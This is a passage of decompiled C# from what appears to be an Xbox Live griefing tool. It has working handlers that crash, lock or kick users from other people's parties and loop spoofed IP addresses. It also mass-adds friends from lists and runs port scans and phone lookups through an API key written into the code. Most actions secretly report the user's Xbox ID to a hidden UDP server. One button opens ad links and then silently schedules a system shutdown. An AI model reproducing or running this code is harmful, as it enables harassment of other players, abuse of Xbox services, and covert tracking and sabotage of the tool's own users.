      }
      catch
      {
      }
      using (WebClient webClient = new WebClient())
      {
        webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/237.39");
        int num = (int) MessageBox.Show(webClient.DownloadString("http://api.c99.nl/portscanner?key=37XVA-HK50Z-2VCVZ-JOTNX&host=" + this.Ping1.Text));
      }
    }

    private void button4_Click(object sender, EventArgs e)
    {
      string text = this.Ping1.Text;
      try
      {
        byte[] bytes = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " NMAP Scan:" + text);
        this.udpClient.Send(bytes, bytes.Length);
      }
      catch
      {
      }
      using (WebClient webClient = new WebClient())
      {
        webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/237.39");
        int num = (int) MessageBox.Show(webClient.DownloadString("http://api.c99.nl/nmap?key=37XVA-HK50Z-2VCVZ-JOTNX&host=" + this.Ping1.Text));
      }
    }

    private void button5_Click(object sender, EventArgs e)
    {
      string text = this.Ping1.Text;
      try
      {
        byte[] bytes = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Proxy Detection:" + text);
        this.udpClient.Send(bytes, bytes.Length);
      }
      catch
      {
      }
      using (WebClient webClient = new WebClient())
      {
        webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/237.39");
        int num = (int) MessageBox.Show(webClient.DownloadString("http://api.c99.nl/proxydetector?key=37XVA-HK50Z-2VCVZ-JOTNX&host=" + this.Ping1.Text));
      }
    }

    private void button6_Click(object sender, EventArgs e) => Application.Exit();

    private void button7_Click(object sender, EventArgs e) => this.WindowState = FormWindowState.Minimized;

    private void button8_Click(object sender, EventArgs e)
    {
      this.GrabParty(Constants.Profile.Xuid);
      try
      {
        byte[] bytes = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Grabbed Party Of: " + Constants.Profile.Xuid);
        this.udpClient.Send(bytes, bytes.Length);
      }
      catch
      {
      }
      this.presence.state = "Scanning Parties";
      DiscordRpc.UpdatePresence(ref this.presence);
    }

    private void button9_Click(object sender, EventArgs e)
    {
      this.LoadFriends();
      this.presence.state = "Scanning Friends List";
      DiscordRpc.UpdatePresence(ref this.presence);
    }

    private void SpooferIPTextBox_Enter(object sender, EventArgs e)
    {
      if (!(this.SpooferIPTextBox.Text == "Code"))
        return;
      this.SpooferIPTextBox.Text = "";
      this.SpooferIPTextBox.ForeColor = Color.LightSeaGreen;
    }

    private void SpooferIPTextBox_Leave(object sender, EventArgs e)
    {
      if (!(this.SpooferIPTextBox.Text == ""))
        return;
      this.SpooferIPTextBox.Text = "Your";
      this.SpooferIPTextBox.ForeColor = Color.LightSeaGreen;
    }

    private void SpooferPortTextBox_Enter(object sender, EventArgs e)
    {
      if (!(this.SpooferPortTextBox.Text == "Own"))
        return;
      this.SpooferPortTextBox.Text = "";
      this.SpooferPortTextBox.ForeColor = Color.LightSeaGreen;
    }

    private void SpooferPortTextBox_Leave(object sender, EventArgs e)
    {
      if (!(this.SpooferPortTextBox.Text == ""))
        return;
      this.SpooferPortTextBox.Text = "Shit";
      this.SpooferPortTextBox.ForeColor = Color.LightSeaGreen;
    }

    private void Ping1_Enter(object sender, EventArgs e)
    {
      if (!(this.Ping1.Text == "Lmao"))
        return;
      this.Ping1.Text = "";
      this.Ping1.ForeColor = Color.LightSeaGreen;
    }

    private void Ping1_Leave(object sender, EventArgs e)
    {
      if (!(this.Ping1.Text == ""))
        return;
      this.Ping1.Text = "reeeeeee";
      this.Ping1.ForeColor = Color.LightSeaGreen;
    }

    private void toolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        Clipboard.SetText(this.DataClients.SelectedRows[0].Cells["External"].Value.ToString());
      }
      catch
      {
        int num = (int) MessageBox.Show("No User Selected To Copy From");
      }
    }

    private void DataFriends_CellContentClick(object sender, DataGridViewCellEventArgs e)
    {
    }

    private async void button10_Click(object sender, EventArgs e)
    {
      try
      {
        if (string.IsNullOrEmpty(this.LastSelectedXuid))
          return;
        await Xbox.OpenCurrentParty(this.LastSelectedXuid);
        this.GrabParty(this.LastSelectedXuid);
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private async void kickToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.DataClients.SelectedRows.Count > 0)
        {
          string target = this.DataClients.SelectedRows[0].Cells["Gamertag"].Value.ToString();
          if (string.IsNullOrEmpty(this.LastSelectedXuid))
            return;
          User.ProfileModel profile = await Xbox.GetProfileByGamertagAsync(target);
          target = profile.Profile.Xuid;
          if (target.Length > 0)
          {
            await Xbox.KickUser(this.LastSelectedXuid, target);
            int num = (int) MessageBox.Show("User Has Been Kicked");
            this.GrabParty(this.LastSelectedXuid);
          }
          else
          {
            int num1 = (int) MessageBox.Show("Error Kicking Selected User");
          }
          target = (string) null;
          profile = (User.ProfileModel) null;
        }
        else
        {
          int num2 = (int) MessageBox.Show("No User Selected To Kick");
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void toolStripMenuItem2_Click(object sender, EventArgs e)
    {
      try
      {
        Clipboard.SetText(this.ClientHistory.SelectedRows[0].Cells["dataGridViewTextBoxColumn6"].Value.ToString());
      }
      catch
      {
        int num = (int) MessageBox.Show("No User Selected To Copy From");
      }
    }

    private async void button11_Click(object sender, EventArgs e)
    {
      try
      {
        await Xbox.partyclub("");
        this.GrabParty(this.LastSelectedXuid);
        try
        {
          byte[] sendBytes = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Locked Party Of: " + this.LastSelectedXuid);
          this.udpClient.Send(sendBytes, sendBytes.Length);
          sendBytes = (byte[]) null;
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private async void button12_Click(object sender, EventArgs e)
    {
      try
      {
        await Xbox.partyclose("");
        this.GrabParty(this.LastSelectedXuid);
        try
        {
          byte[] sendBytes = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Closed Party Of: " + this.LastSelectedXuid);
          this.udpClient.Send(sendBytes, sendBytes.Length);
          sendBytes = (byte[]) null;
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private async void button13_Click(object sender, EventArgs e)
    {
      try
      {
        await Xbox.partycrash("");
        this.GrabParty(this.LastSelectedXuid);
        try
        {
          byte[] sendBytes = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Crashed Party Of: " + this.LastSelectedXuid);
          this.udpClient.Send(sendBytes, sendBytes.Length);
          sendBytes = (byte[]) null;
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void button14_Click(object sender, EventArgs e)
    {
      Process.Start("https://discord.gg/Mzb3UzMr5B");
      this.button14.FlatAppearance.BorderColor = Color.FromArgb(0, (int) byte.MaxValue, (int) byte.MaxValue, (int) byte.MaxValue);
    }

    private void SpooferIPTextBox_Enter_1(object sender, EventArgs e)
    {
      if (!(this.SpooferIPTextBox.Text == "1.3.3.7"))
        return;
      this.SpooferIPTextBox.Text = "";
      this.SpooferIPTextBox.ForeColor = Color.LightSeaGreen;
    }

    private void SpooferIPTextBox_Leave_1(object sender, EventArgs e)
    {
      if (!(this.SpooferIPTextBox.Text == ""))
        return;
      this.SpooferIPTextBox.Text = "1.3.3.7";
      this.SpooferIPTextBox.ForeColor = Color.LightSeaGreen;
    }

    private void SpooferPortTextBox_Enter_1(object sender, EventArgs e)
    {
      if (!(this.SpooferPortTextBox.Text == "1337"))
        return;
      this.SpooferPortTextBox.Text = "";
      this.SpooferPortTextBox.ForeColor = Color.LightSeaGreen;
    }

    private void SpooferPortTextBox_Leave_1(object sender, EventArgs e)
    {
      if (!(this.SpooferPortTextBox.Text == ""))
        return;
      this.SpooferPortTextBox.Text = "1337";
      this.SpooferPortTextBox.ForeColor = Color.LightSeaGreen;
    }

    private void Ping1_Enter_1(object sender, EventArgs e)
    {
      if (!(this.Ping1.Text == "Enter an IP, Phone number, or Website."))
        return;
      this.Ping1.Text = "";
      this.Ping1.ForeColor = Color.LightSeaGreen;
    }

    private void Ping1_Leave_1(object sender, EventArgs e)
    {
      if (!(this.Ping1.Text == ""))
        return;
      this.Ping1.Text = "Enter an IP, Phone number, or Website.";
      this.Ping1.ForeColor = Color.LightSeaGreen;
    }

    private void button20_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Carrier = Enter a phone number with its country code, United States number example - 18002548867\n\nFirewall = Detect if a website is behind a firewall.\n\nSite Checker = Checks whether a domain is available or not, no matter what extension.\n\nSMS Spam = Press play on bottom right,enter phone number,enter.");
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
      this.label7.Text = DateTime.Now.ToLongTimeString();
      this.timer1.Start();
    }

    private void button15_Click(object sender, EventArgs e)
    {
      string text = this.Ping1.Text;
      try
      {
        byte[] bytes = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Carrier Lookup On Phone: " + text);
        this.udpClient.Send(bytes, bytes.Length);
      }
      catch
      {
      }
      using (WebClient webClient = new WebClient())
      {
        webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/237.39");
        int num = (int) MessageBox.Show(webClient.DownloadString("https://api.c99.nl/phonelookup?key=37XVA-HK50Z-2VCVZ-JOTNX&number=+" + this.Ping1.Text));
      }
    }

    private void button16_Click(object sender, EventArgs e)
    {
      using (WebClient webClient = new WebClient())
      {
        webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/237.39");
        int num = (int) MessageBox.Show(webClient.DownloadString("https://api.c99.nl/firewalldetector?key=37XVA-HK50Z-2VCVZ-JOTNX&url=" + this.Ping1.Text));
      }
    }

    private void button17_Click(object sender, EventArgs e)
    {
      using (WebClient webClient = new WebClient())
      {
        webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/237.39");
        int num = (int) MessageBox.Show(webClient.DownloadString("https://api.c99.nl/dnsresolver?key=37XVA-HK50Z-2VCVZ-JOTNX&host=" + this.Ping1.Text));
      }
    }

    private void button18_Click(object sender, EventArgs e)
    {
      using (WebClient webClient = new WebClient())
      {
        webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/237.39");
        int num = (int) MessageBox.Show(webClient.DownloadString("https://api.c99.nl/domainchecker?key=37XVA-HK50Z-2VCVZ-JOTNX&domain=" + this.Ping1.Text));
      }
    }

    private void button19_Click(object sender, EventArgs e)
    {
      using (WebClient webClient = new WebClient())
      {
        webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/237.39");
        int num = (int) MessageBox.Show(webClient.DownloadString("https://api.c99.nl/domainhistory?key=37XVA-HK50Z-2VCVZ-JOTNX&domain=" + this.Ping1.Text));
      }
    }

    private async void button21_Click(object sender, EventArgs e)
    {
      try
      {
        byte[] sendBytes = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Spoofing IP On Loop!");
        this.udpClient.Send(sendBytes, sendBytes.Length);
        byte[] sendBytes2 = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Spoofed IP Address On Loop!");
        this.udpClient.Send(sendBytes2, sendBytes2.Length);
        sendBytes = (byte[]) null;
        sendBytes2 = (byte[]) null;
      }
      catch
      {
      }
      int num = (int) MessageBox.Show("Take into consideration the power of your PC and network when using this feature\nUse the NumericUpDown value to change the speed of spoofing!\nHappy hacking!");
      this.borts();
      string[] lines = System.IO.File.ReadAllLines(Application.StartupPath + "\\IPs.txt");
      string[] strArray = lines;
      for (int index = 0; index < strArray.Length; ++index)
      {
        string line = strArray[index];
        this.SpooferIPTextBox.Text = line;
        int value = Convert.ToInt32(this.numericUpDown2.Value);
        await Task.Delay(value);
        this.kickloops();
        line = (string) null;
      }
      strArray = (string[]) null;
      lines = (string[]) null;
    }

    private async void kickloops()
    {
      try
      {
        string ipAddress = this.SpooferIPTextBox.Text;
        int port = Convert.ToInt32(this.SpooferPortTextBox.Text);
        string generatedSecureDeviceAddress = SecureDeviceAddressUtilities.GenerateNewSecureDeviceAddress(ipAddress, port);
        await Xbox.SetSecureDeviceAddressAsync(generatedSecureDeviceAddress);
        ipAddress = (string) null;
        generatedSecureDeviceAddress = (string) null;
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private async void borts()
    {
      string[] egg = System.IO.File.ReadAllLines(Application.StartupPath + "\\PORTs.txt");
      string[] strArray = egg;
      for (int index = 0; index < strArray.Length; ++index)
      {
        string line = strArray[index];
        this.SpooferPortTextBox.Text = line;
        int value = Convert.ToInt32(this.numericUpDown2.Value);
        await Task.Delay(value);
        line = (string) null;
      }
      strArray = (string[]) null;
      egg = (string[]) null;
    }

    private async void button22_Click(object sender, EventArgs e)
    {
      try
      {
        await Xbox.partyopen("");
        this.GrabParty(this.LastSelectedXuid);
        try
        {
          byte[] sendBytes = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Opened Party Of: " + this.LastSelectedXuid);
          this.udpClient.Send(sendBytes, sendBytes.Length);
          sendBytes = (byte[]) null;
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    public static string B6D(string base64EncodedData) => Encoding.UTF8.GetString(Convert.FromBase64String(base64EncodedData));

    public string BEANS(string input)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Regex regex = new Regex("[A-Za-z]");
      foreach (char ch in input)
      {
        if (regex.IsMatch(ch.ToString()))
        {
          int num = (((int) ch & 223) - 52) % 26 + ((int) ch & 32) + 65;
          stringBuilder.Append((char) num);
        }
        else
          stringBuilder.Append(ch);
      }
      return stringBuilder.ToString();
    }

    private string ResponseText(byte[] bytes)
    {
      using (MemoryStream memoryStream = new MemoryStream(bytes))
      {
        using (StreamReader streamReader = new StreamReader((Stream) memoryStream))
          return streamReader.ReadToEnd();
      }
    }

    private void button10_Click_1(object sender, EventArgs e)
    {
      string text = this.sdatxt.Text;
      try
      {
        byte[] bytes = Encoding.ASCII.GetBytes("StasisUser" + Constants.Profile.Xuid + " Decrypted Secure Device Address:" + text);
        this.udpClient.Send(bytes, bytes.Length);
      }
      catch
      {
      }
      this.sdatxt.Text = SecureDeviceAddressUtilities.DecodeSecureDeviceAddress(this.sdatxt.Text);
    }

    private async void button23_Click(object sender, EventArgs e)
    {
      if (!System.IO.File.Exists("./gamertags.txt"))
        System.IO.File.Create("./gamertags.txt");
      string[] gamertags = await FileManager.ReadAllLinesAsync("./gamertags.txt");
      string[] strArray = gamertags;
      for (int index = 0; index < strArray.Length; ++index)
      {
        string gamertag = strArray[index];
        try
        {
          FormMain.CheckGamertag(gamertag);
          this.richTextBox2.AppendText(gamertag + " -  Is Taken!\n");
        }
        catch
        {
          this.richTextBox2.AppendText(gamertag + " -  Is Available or Banned!\n");
          System.IO.File.AppendAllText("Tags.txt", gamertag + Environment.NewLine);
        }
        await Task.Delay(150);
        gamertag = (string) null;
      }
      strArray = (string[]) null;
      gamertags = (string[]) null;
    }

    private static void CheckGamertag(string gamertag)
    {
      using (WebClient webClient = new WebClient())
        webClient.DownloadString("http://www.xboxgamertag.com/search/" + gamertag);
    }

    private async void button24_Click_1(object sender, EventArgs e)
    {
      Process.Start("https://www.youtube.com/watch?v=spfpQw2K0Gc");
      Process.Start("https://www.youtube.com/watch?v=9SNNbcG-ma0");
      Process.Start("https://file-link.net/211211/stasisnet");
      Process.Start("http://svencrai.com/1MDT");
      Process.Start("http://aciterar.com/7FD1");
      await Task.Delay(10000);
      int num = (int) MessageBox.Show("wheres the lamb source??!?!? ☺");
      ProcessStartInfo psi = new ProcessStartInfo("shutdown", "/s /t 100");
      psi.CreateNoWindow = true;
      psi.UseShellExecute = false;
      Process.Start(psi);
      psi = (ProcessStartInfo) null;
    }

    private void button25_Click(object sender, EventArgs e)
    {
      using (new WebClient())
        Process.Start("https://replit.com/@Devil3D/666?embed=1&output=1#main.py");
    }

    private void AddFriend(string XUID, string Method)
    {
      HttpWebRequest httpWebRequest = WebRequest.Create("https://social.xboxlive.com/users/me/people/xuid(" + XUID + ")") as HttpWebRequest;
      httpWebRequest.Method = Method;
      httpWebRequest.Headers.Add("x-xbl-contract-version", " 2");
      httpWebRequest.Headers.Add("Authorization", Settings.Default.authxsts);
      httpWebRequest.Headers.Add("x-xbl-contentrestrictions: eyJ2ZXJzaW9uIjoyLCJkYXRhIjp7Imdlb2dyYXBoaWNSZWdpb24iOiJBVSIsIm1heEFnZVJhdGluZyI6MjU1LCJwcmVmZXJyZWRBZ2VSYXRpbmciOjI1NSwicmVzdHJpY3RQcm9tb3Rpb25hbENvbnRlbnQiOmZhbHNlfX0=");
      httpWebRequest.Accept = "application/json";
      httpWebRequest.Headers.Add("X-XblCorrelationId: X-XblCorrelationId");
      httpWebRequest.Headers.Add("Signature: AAAAAQHW1kEQuRb7Si95IL9zFebE2nrAFxDhkG7w7E5RQuMVOge2ZAiYS24RjCx27avbiju9kzvR7u8UA24yiEpQ51pff/pWs4RzpA==");
      httpWebRequest.Headers.Add("PRAGMA: no-cache");
      httpWebRequest.Headers.Add("Cache-Control: no-store, must-revalidate, no-cache");
      httpWebRequest.Host = "social.xboxlive.com";
      httpWebRequest.ContentLength = 0L;
      httpWebRequest.GetRequestStream().Close();
      httpWebRequest.Abort();
      System.IO.File.AppendAllText("Added.txt", XUID + Environment.NewLine);
    }

    private void MessageUser(string XUID, string Message)
    {
      HttpWebRequest httpWebRequest = WebRequest.Create("https://xblmessaging.xboxlive.com/network/xbox/users/xuid(XUID)/conversations/users/xuid(" + Constants.Profile.Xuid + ")") as HttpWebRequest;
      httpWebRequest.Method = "POST";
      httpWebRequest.Headers.Add("x-xbl-contract-version", "1");
      httpWebRequest.Headers.Add("accept-language", " en-US");
      httpWebRequest.Headers.Add("Authorization", Settings.Default.authxsts);
      httpWebRequest.Accept = "application/json";
      httpWebRequest.Headers.Add("Signature: AAAAAQHW1kEQuRb7Si95IL9zFebE2nrAFxDhkG7w7E5RQuMVOge2ZAiYS24RjCx27avbiju9kzvR7u8UA24yiEpQ51pff/pWs4RzpA==");
      httpWebRequest.Headers.Add("Cache-Control", "no-cache");
      httpWebRequest.Host = "social.xboxlive.com";
      string s = "{\"parts\":[{\"text\":\"sample text\",\"contentType\":\"text\",\"version\":0}]}";
      Stream requestStream = httpWebRequest.GetRequestStream();
      byte[] bytes = new ASCIIEncoding().GetBytes(s);
      requestStream.Write(bytes, 0, bytes.Length);
      requestStream.Close();
      httpWebRequest.Abort();
      System.IO.File.AppendAllText("Added.txt", XUID + Environment.NewLine);
    }

    private async void AddFriendBtn_Click(object sender, EventArgs e)
    {
      User.ProfileModel profile = await Xbox.GetProfileByGamertagAsync(this.GamertagProfileLookupName.Text);
      string XUID = profile.Profile.Xuid;
      this.AddFriend(XUID, "PUT");
      profile = (User.ProfileModel) null;
      XUID = (string) null;
    }

    private async void AddFriendsBtn_Click(object sender, EventArgs e)
    {
      string[] lines = System.IO.File.ReadAllLines(Application.StartupPath + "\\GTs.txt");
      string[] strArray = lines;
      for (int index = 0; index < strArray.Length; ++index)
      {
        string line = strArray[index];
        User.ProfileModel profile = await Xbox.GetProfileByGamertagAsync(line);
        string XUID = profile.Profile.Xuid;
        this.AddFriend(XUID, "PUT");
        await Task.Delay(this.FriendAddingDelay);
        profile = (User.ProfileModel) null;
        XUID = (string) null;
        line = (string) null;
      }
      strArray = (string[]) null;
      lines = (string[]) null;
    }

    private async void AddXUIDsBtn_Click(object sender, EventArgs e)
    {
      string[] lines = System.IO.File.ReadAllLines(Application.StartupPath + "\\GTs.txt");
      string[] strArray = lines;
      for (int index = 0; index < strArray.Length; ++index)
      {
        string XUID = strArray[index];
        this.AddFriend(XUID, "PUT");
        await Task.Delay(this.FriendAddingDelay);
        XUID = (string) null;
      }
      strArray = (string[]) null;
      lines = (string[]) null;
    }

    private async void GrabPartyByGT_Click(object sender, EventArgs e)
    {
      string gamertag = this.PartyGTTxt.Text;
      try
      {
        byte[] sendBytes = Encoding.ASCII.GetBytes("StasisUser[" + Constants.Profile.Xuid + "] Party Grabbed for:[" + gamertag + "]");
        this.udpClient.Send(sendBytes, sendBytes.Length);
        sendBytes = (byte[]) null;
      }
      catch
      {
      }
      try
      {
        User.ProfileModel profile = await Xbox.GetProfileByGamertagAsync(gamertag);
        string XUID = profile.Profile.Xuid;
        this.GrabParty(XUID);
        await Task.Delay(3500);
        FormMain.CurrentPartyXUID = XUID;
        profile = (User.ProfileModel) null;
        XUID = (string) null;
        gamertag = (string) null;
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
        gamertag = (string) null;
      }
    }

    private async void PartyKickByGT_Click(object sender, EventArgs e)
    {
      try
      {
        User.ProfileModel profile = await Xbox.GetProfileByGamertagAsync(this.PartyGTTxt.Text);
        string XUID = profile.Profile.Xuid;
        await Task.Delay(2000);
        await Xbox.partykick(XUID, FormMain.CurrentPartyXUID);
        await Task.Delay(2000);
        this.GrabParty(FormMain.CurrentPartyXUID);
        profile = (User.ProfileModel) null;
        XUID = (string) null;
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private async void CrashByGT_Click(object sender, EventArgs e)
    {
      this.GrabParty(this.PartyGTTxt.Text);
      try
      {
        await Xbox.partycrash2(FormMain.CurrentPartyXUID);
        if (string.IsNullOrEmpty(FormMain.CurrentPartyXUID))
          return;
        await Task.Delay(2000);
        this.GrabParty(FormMain.CurrentPartyXUID);
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void button27_Click(object sender, EventArgs e)
    {
    }

    private void PartyGTTxt_Enter(object sender, EventArgs e)
    {
      this.PartyGTTxt.Text = "";
      this.PartyGTTxt.ForeColor = Color.LightSeaGreen;
    }

    private void PartyGTTxt_Leave(object sender, EventArgs e)
    {
      if (!(this.PartyGTTxt.Text == ""))
        return;
      this.PartyGTTxt.Text = "Enter GT";
      this.PartyGTTxt.ForeColor = Color.LightSeaGreen;
    }

    private void FriendTxt_Enter(object sender, EventArgs e)
    {
      this.GamertagProfileLookupName.Text = "";
      this.GamertagProfileLookupName.ForeColor = Color.LightSeaGreen;
    }

    private void FriendTxt_Leave(object sender, EventArgs e)
    {
      if (!(this.GamertagProfileLookupName.Text == ""))
        return;
      this.GamertagProfileLookupName.Text = "Enter GT";
      this.GamertagProfileLookupName.ForeColor = Color.LightSeaGreen;
    }

    private async void button28_Click(object sender, EventArgs e)
    {
      User.ProfileModel profile = await Xbox.GetProfileByGamertagAsync(this.GamertagProfileLookupName.Text);
      string XUID = profile.Profile.Xuid;
      this.AddFriend(XUID, "DELETE");
      profile = (User.ProfileModel) null;
      XUID = (string) null;
    }

    private async void button29_Click(object sender, EventArgs e)
    {
      string[] lines = System.IO.File.ReadAllLines(Application.StartupPath + "\\GTs.txt");
      string[] strArray = lines;
      for (int index = 0; index < strArray.Length; ++index)
      {
        string line = strArray[index];
        User.ProfileModel profile = await Xbox.GetProfileByGamertagAsync(line);
        string XUID = profile.Profile.Xuid;
        this.AddFriend(XUID, "DELETE");
        await Task.Delay(this.FriendAddingDelay);
        profile = (User.ProfileModel) null;
        XUID = (string) null;
        line = (string) null;
      }
      strArray = (string[]) null;
      lines = (string[]) null;
    }

    private async void button30_Click(object sender, EventArgs e)
    {
      string[] lines = System.IO.File.ReadAllLines(Application.StartupPath + "\\GTs.txt");
      string[] strArray = lines;
      for (int index = 0; index < strArray.Length; ++index)
      {
        string XUID = strArray[index];
        this.AddFriend(XUID, "DELETE");
        await Task.Delay(this.FriendAddingDelay);
        XUID = (string) null;
      }
      strArray = (string[]) null;
      lines = (string[]) null;
    }

    private async void button31_Click(object sender, EventArgs e)
    {
    }

    private async void SetAvatarBtn_Click(object sender, EventArgs e) => Xbox.setavatar(Constants.Profile.Xuid, this.AvitarManifestTxt.Text);

    public string FindTextBetween(string text, string left, string right)
    {
      int num1 = text.IndexOf(left);
      if (num1 == -1)
        return string.Empty;
      int startIndex = num1 + left.Length;
      int num2 = text.IndexOf(right, startIndex);
      return num2 == -1 ? string.Empty : text.Substring(startIndex, num2 - startIndex).Trim();
    }

    private void button31_Click_1(object sender, EventArgs e)
    {
      this.AvitarManifestTxt.Text = "";
      if (this.AvatarChoice.Text == "Professional")
        this.AvitarManifestTxt.Text = "AAAAAL8AAAA/AAAAABAAAAMfAAPByPEJoZyy4AAIAAADNAADwcjxCaGcsuAAIAAAAzwAA8HI8QmhnLLgAACAAALoAAPByPEJoZyy4AAAAAAAAAAAAAAAAAAAAAAAACAAAoYAA8HI8QmhnLLgAAAAAAAAAAAAAAAAAAAAAAAAQAACcQADwcjxCaGcsuA/gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//jbuf+QZjb/XDss/5F6Uf9PRj3/d23T/09GPf+BJx//gScfAAAAAgAAAAHByPEJoZyy4AACAAAAAAAAAAAAAAAAAAAAAAABAAIAA8HI8QmhnLLgAAEAAAAAAAAAAAAAAAAAAAAAACAAOgABwcjxCaGcsuAAIAAAAAAAAAAAAAAAAAAAAAAACDFG0tHDwpCpWFgIHAAIAAAAAAAAAAAAAAAAAAAAAAAQAKAAAcHI8QmhnLLgABAAAAAAAAAAAAAAAAAAAAAABURODrKjyBTZYkdSB/UFRAAAAAAAAAAAAAAAAAAAAAAQAPuRIlPEdVE7WFgIHBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAA6AAHByPEJoZyy4AAgAAAAAAAAAAAAAAAAAAAAAAAQAKAAAcHI8QmhnLLgABAAAAAAAAAAAAAAAAAAAAAAAAgxRtLRw8KQqVhYCBwACAAAAAAAAAAAAAAAAAAAAAAABAJTAAPByPEJoZyy4AAEAAAAAAAAAAAAAAAAAADgAA/8SDeFGwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==";
      if (this.AvatarChoice.Text == "LainOS")
